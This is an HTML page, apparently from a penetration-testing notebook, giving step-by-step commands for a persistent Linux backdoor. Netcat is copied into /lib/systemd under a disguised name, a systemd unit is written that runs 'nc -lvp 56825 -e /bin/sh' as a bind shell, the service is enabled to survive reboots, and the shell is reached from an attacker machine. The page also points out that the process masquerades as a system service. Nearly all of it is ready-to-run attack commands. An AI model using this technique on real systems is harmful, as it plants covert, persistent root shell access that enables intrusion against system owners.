<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>backdoor with Systemd daemon (Linux)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>backdoor with Systemd daemon (Linux)</h1><br /><strong>Prerequisites:</strong><br />• root on the
    target<br /><br /><br />For this backdoor we will use <a href="https://en.wikipedia.org/wiki/Systemd" target="_blank">Systemd</a>,
    that is been a replacement for the old <a href="https://en.wikipedia.org/wiki/Init#SysV-style" target="_blank">UNIX System V
      init</a> system used to launch services and processes and system startup.<br />Similar method of the <a
      href="Home--Penetration_Test_Methodology--Network_Pentest--Post_Exploitation--Maintain_Access--Backdoor--backdoor_with_xinetd_daemon_(Linux).html">Xinetd
      backdoor</a>, but this one will create a “bind shell” rather than initiate a reverse shell.<br /><br />1. On the
    <span style="color:#1e90ff;">target system</span>, we’re again going to copy the /bin/nc executable, but this time
    to the /lib/systemd directory, and we’ll call it “systemd-service”<br />
    <div class="codebox">
      <div class="codebox">root@debian:/$&nbsp;cp&nbsp;/bin/nc&nbsp;/lib/systemd/systemd-service</div>
    </div><br /><br />2. Still, on the <span style="color:#1e90ff;">target</span>, we’re going to create a file called
    /lib/systemd/system/systemd.service <br />
    <div class="codebox">
      <div class="codebox">
        root@debian:/$&nbsp;touch&nbsp;/lib/systemd/system/systemd.service<br />root@debian:/$&nbsp;vim&nbsp;/lib/systemd/system/systemd.service
      </div>
    </div><br /> with the following contents:<br />
    <div class="codebox">
      <div class="codebox">
        [Unit]<br />Description&nbsp;=&nbsp;Systemd&nbsp;Service<br />After&nbsp;=&nbsp;network.target<br />[Service]<br />ExecStart&nbsp;=&nbsp;/lib/systemd/systemd-service&nbsp;-lvp&nbsp;56825&nbsp;-e&nbsp;/bin/sh<br />[Install]<br />WantedBy&nbsp;=&nbsp;multi-user.target
      </div>
    </div><br /> The above systemd service configuration file will create bind shell on port 56825 TCP.<br /><br />3. On
    the <span style="color:#1e90ff;">target</span> Enable our new Systemd Netcat Bind Shell service, and start our
    Systemd Netcat Bind Shell Service <br />
    <div class="codebox">
      <div class="codebox">
        root@debian:/$&nbsp;systemctl&nbsp;enable&nbsp;systemd.service<br />root@debian:/$&nbsp;systemctl&nbsp;start&nbsp;systemd.service
      </div>
    </div><br /><br />4. Confirm that our port for our custom service is listening on the <span
      style="color:#1e90ff;">target</span><br />
    <div class="codebox">
      <div class="codebox">root@debian:/$&nbsp;netstat&nbsp;–auntp&nbsp;|&nbsp;grep&nbsp;56825</div>
    </div><br /><br />5. From our <span style="color:#ff0000;">attacker machine</span>, we should now be able to connect
    to port 56825 using netcat and get a shell:<br />
    <div class="codebox">
      <div class="codebox">attacker@kali:/$&nbsp;nc&nbsp;&lt;target_IP&gt;&nbsp;56825</div>
    </div><br /><br />This service will <strong>persist on reboots</strong> and will be listed as “systemd-service” when
    we will list processes.
  </div>
</body>

</html>